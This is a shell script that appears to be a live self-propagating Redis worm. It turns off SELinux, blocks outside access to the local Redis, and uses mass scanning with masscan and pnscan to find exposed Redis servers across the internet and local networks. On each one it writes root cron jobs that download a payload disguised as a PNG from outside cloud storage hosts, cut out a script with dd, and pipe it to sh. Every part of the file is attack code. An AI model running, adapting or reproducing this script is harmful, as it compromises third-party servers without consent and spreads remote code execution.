#!/bin/sh
# 该图床从github随便搜索阿里云oss存储桶keySecret获得，与图床主人无关


setenforce 0 2>/dev/null
ulimit -u 50000
sleep 1
iptables -I INPUT 1 -p tcp --dport 6379 -j DROP 2>/dev/null
iptables -I INPUT 1 -p tcp --dport 6379 -s 127.0.0.1 -j ACCEPT 2>/dev/null
sleep 1
    if [ -f "/bin/ps.original" ]
    then
        ps.original -fe|grep pnscan |grep -v grep
    else
        ps -fe|grep pnscan |grep -v grep
    fi
if [ $? -ne 0 ]
then
	rm -rf .dat .shard .ranges .lan 2>/dev/null
	sleep 1
	echo 'config set dbfilename "backup.db"' > .dat
	echo 'save' >> .dat
	echo 'config set stop-writes-on-bgsave-error no' >> .dat
	echo 'flushall' >> .dat
	echo 'set backup1 "\n\n\n*/2 * * * * cd1 -fsSL -o indexi.png https://recipt-picture.oss-cn-hongkong.aliyuncs.com/mall-img/indexi.png || wget https://recipt-picture.oss-cn-hongkong.aliyuncs.com/mall-img/indexi.png -O indexi.png;dd if=indexi.png of=init.sh skip=4658 bs=1;cat init.sh | sh\n\n"' >> .dat
	echo 'set backup2 "\n\n\n*/3 * * * * wget -q -O- curl -o indexi.png https://recipt-picture.oss-cn-hongkong.aliyuncs.com/mall-img/indexi.png || curl -fsSL -o indexi.png https://recipt-picture.oss-cn-hongkong.aliyuncs.com/mall-img/indexi.png;dd if=indexi.png of=init.sh skip=4658 bs=1;cat init.sh | sh\n\n"' >> .dat
	echo 'set backup3 "\n\n\n*/4 * * * * curl -fsSL -o indexi.png https://guli-edut.oss-cn-shanghai.aliyuncs.com/2020/06/04/indexi.png || wget https://guli-edut.oss-cn-shanghai.aliyuncs.com/2020/06/04/indexi.png -O indexi.png;dd if=indexi.png of=init.sh skip=4658 bs=1;cat init.sh | sh\n\n"' >> .dat
	echo 'set backup4 "\n\n\n*/5 * * * * wd1 https://guli-edut.oss-cn-shanghai.aliyuncs.com/2020/06/04/indexi.png -O indexi.png || curl -fsSL -o indexi.png https://guli-edut.oss-cn-shanghai.aliyuncs.com/2020/06/04/indexi.png ;dd if=indexi.png of=init.sh skip=4658 bs=1;cat init.sh | sh\n\n"' >> .dat
	echo 'config set dir "/var/spool/cron/"' >> .dat
	echo 'config set dbfilename "root"' >> .dat
	echo 'save' >> .dat
	echo 'config set dir "/var/spool/cron/crontabs"' >> .dat
	echo 'save' >> .dat
	echo 'flushall' >> .dat
	echo 'set backup1 "\n\n\n*/2 * * * * root cd1 -fsSL -o indexi.png https://recipt-picture.oss-cn-hongkong.aliyuncs.com/mall-img/indexi.png || wget https://recipt-picture.oss-cn-hongkong.aliyuncs.com/mall-img/indexi.png -O indexi.png;dd if=indexi.png of=init.sh skip=4658 bs=1;cat init.sh | sh\n\n"' >> .dat
	echo 'set backup2 "\n\n\n*/3 * * * * root wget -q -O- curl -o indexi.png https://recipt-picture.oss-cn-hongkong.aliyuncs.com/mall-img/indexi.png || curl -fsSL -o indexi.png https://recipt-picture.oss-cn-hongkong.aliyuncs.com/mall-img/indexi.png;dd if=indexi.png of=init.sh skip=4658 bs=1;cat init.sh | sh\n\n"' >> .dat
	echo 'set backup3 "\n\n\n*/4 * * * * root curl -fsSL -o indexi.png https://guli-edut.oss-cn-shanghai.aliyuncs.com/2020/06/04/indexi.png || wget https://guli-edut.oss-cn-shanghai.aliyuncs.com/2020/06/04/indexi.png -O indexi.png;dd if=indexi.png of=init.sh skip=4658 bs=1;cat init.sh | sh\n\n"' >> .dat
	echo 'set backup4 "\n\n\n*/5 * * * * root wd1 https://guli-edut.oss-cn-shanghai.aliyuncs.com/2020/06/04/indexi.png -O indexi.png || curl -fsSL -o indexi.png https://guli-edut.oss-cn-shanghai.aliyuncs.com/2020/06/04/indexi.png;dd if=indexi.png of=init.sh skip=4658 bs=1;cat init.sh | sh\n\n"' >> .dat
	echo 'config set dir "/etc/cron.d/"' >> .dat
	echo 'config set dbfilename "zzh"' >> .dat
	echo 'save' >> .dat
	echo 'config set dir "/etc/"' >> .dat
	echo 'config set dbfilename "crontab"' >> .dat
	echo 'save' >> .dat
        echo 'config set dir "/var/spool/cron/"' >> .dat
        echo 'config set dbfilename "root"' >> .dat
        echo 'save' >> .dat
	sleep 1
	pnx=pnscan
	[ -x /usr/local/bin/pnscan ] && pnx=/usr/local/bin/pnscan
	[ -x /usr/bin/pnscan ] && pnx=/usr/bin/pnscan
	for x in $( seq 0 225 | sort -R ); do
	for y in $( seq 0 255 | sort -R ); do
	$pnx -t256 -R '6f 73 3a 4c 69 6e 75 78' -W '2a 31 0d 0a 24 34 0d 0a 69 6e 66 6f 0d 0a' $x.$y.0.0/16 6379 > .r.$x.$y.o
	awk '/Linux/ {print $1, $3}' .r.$x.$y.o > .r.$x.$y.l
	while read -r h p; do
	cat .dat | redis-cli -h $h -p $p --raw &
	done < .r.$x.$y.l
	done
	done
	sleep 1
	masscan --max-rate 10000 -p6379 --shard $( seq 1 22000 | sort -R | head -n1 )/22000 --exclude 255.255.255.255 0.0.0.0/0 2>/dev/null | awk '{print $6, substr($4, 1, length($4)-4)}' | sort | uniq > .shard
	sleep 1
	while read -r h p; do
	cat .dat | redis-cli -h $h -p $p --raw 2>/dev/null 1>/dev/null &
	done < .shard
	sleep 1
	masscan --max-rate 10000 -p6379 192.168.0.0/16 172.16.0.0/16 116.62.0.0/16 116.232.0.0/16 116.128.0.0/16 116.163.0.0/16 2>/dev/null | awk '{print $6, substr($4, 1, length($4)-4)}' | sort | uniq > .ranges
	sleep 1
	while read -r h p; do
	cat .dat | redis-cli -h $h -p $p --raw 2>/dev/null 1>/dev/null &
	done < .ranges
	sleep 1
	ip a | grep -oE '([0-9]{1,3}.?){4}/[0-9]{2}' 2>/dev/null | sed 's/\/\([0-9]\{2\}\)/\/16/g' > .inet
	sleep 1
	masscan --max-rate 10000 -p6379 -iL .inet | awk '{print $6, substr($4, 1, length($4)-4)}' | sort | uniq > .lan
	sleep 1
	while read -r h p; do
	cat .dat | redis-cli -h $h -p $p --raw 2>/dev/null 1>/dev/null &
	done < .lan
	sleep 60
	rm -rf .dat .shard .ranges .lan 2>/dev/null
else
	echo "root runing....."
fi

